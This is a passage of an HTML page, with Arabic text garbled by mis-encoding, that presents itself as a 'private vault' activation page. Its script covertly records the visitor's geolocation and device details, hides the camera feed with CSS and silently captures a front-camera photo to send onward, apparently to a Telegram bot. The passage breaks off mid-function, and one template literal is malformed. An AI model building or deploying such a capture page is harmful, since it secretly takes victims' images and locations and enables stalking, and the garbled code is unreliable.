<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ“· Ø®Ø²Ø§Ù†Ø© Ø®Ø§ØµØ© - ØªÙ… Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø·</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f4f7f9;
        }
        
        /* ğŸ›‘ Ø¥Ø®ÙØ§Ø¡ Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù€ canvas ğŸ›‘ */
        #camera-feed, #photo-canvas {
            display: none !important; 
        }

        #status-message {
            margin-top: 50px;
            font-weight: bold;
            font-size: 1.5em;
            color: #2c3e50;
        }
    </style>
</head>
<body>

    <h1>âœ… ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø²Ø§Ù†Ø© Ø§Ù„Ø®Ø§ØµØ©</h1>
    <p>ØªØªÙ… Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ø¥Ù„Ù‰ Ø¨ÙˆØª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ©.</p>

    <video id="camera-feed" autoplay playsinline></video>
    <canvas id="photo-canvas"></canvas>

    <p id="status-message">Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹...</p>

    <script>
        const video = document.getElementById('camera-feed');
        const canvas = document.getElementById('photo-canvas');
        const statusMessage = document.getElementById('status-message');
        
        // ğŸ›‘ Ø¯Ø§Ù„Ø© Ø¬Ù…Ø¹ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (Geolocation) ğŸ›‘
        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy 
                            });
                        },
                        (error) => {
                            // Ø¥Ø°Ø§ Ø±ÙØ¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ØŒ Ø£Ø±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§Øª ÙØ§Ø±ØºØ©
                            console.error("Geolocation denied or failed:", error);
                            resolve({ lat: null, lon: null, error: error.message });
                        },
                        { timeout: 5000 } // Ù…Ù‡Ù„Ø© 5 Ø«ÙˆØ§Ù†ÙŠ
                    );
                } else {
                    resolve({ lat: null, lon: null, error: "Geolocation not supported" });
                }
            });
        }
        
        // ğŸ›‘ Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ© ğŸ›‘
        async function captureAndSend() {
            statusMessage.textContent = 'ğŸ“¸ Ø¬Ø§Ø±ÙŠ Ø¬Ù…Ø¹ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©...';

            // 1. Ø¬Ù…Ø¹ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
            const locationData = await getLocation();
            
            const systemData = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                screenResolution: ${screen.width}x${screen.height},
                language: navigator.language,
                // ÙŠØªÙ… Ø¥Ø¶Ø§ÙØ© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù‡Ù†Ø§
                location: locationData
            };
            
            // 2. Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø· (Ù…Ø¹ ØªØ£Ø®ÙŠØ± Ù„Ù…Ù†Ø¹ Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡)
            setTimeout(() => {
                
                canvas.width = video.videoWidth || 640; 
                canvas.height = video.videoHeight || 480;

                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);

                // 3. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹Ù‹Ø§
                sendPhotoToServer(imageDataURL, systemData);

            }, 500); 
        }
        
        // 1. Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        async function startCamera() {
            try {
                const constraints = { video: { facingMode: 'user' } }; 
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
